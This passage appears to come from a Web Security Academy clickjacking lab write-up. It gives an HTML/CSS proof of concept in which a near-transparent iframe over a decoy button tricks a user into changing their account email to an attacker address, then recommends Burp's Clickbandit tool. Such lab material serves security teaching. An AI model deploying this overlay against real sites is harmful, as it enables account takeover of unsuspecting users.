```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:400px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a70006c045af09ec363e38800b000dc.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

## Clickbandit

Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. When you're testing for clickjacking in the wild, we recommend using Burp's [Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) tool instead. This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay. You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS.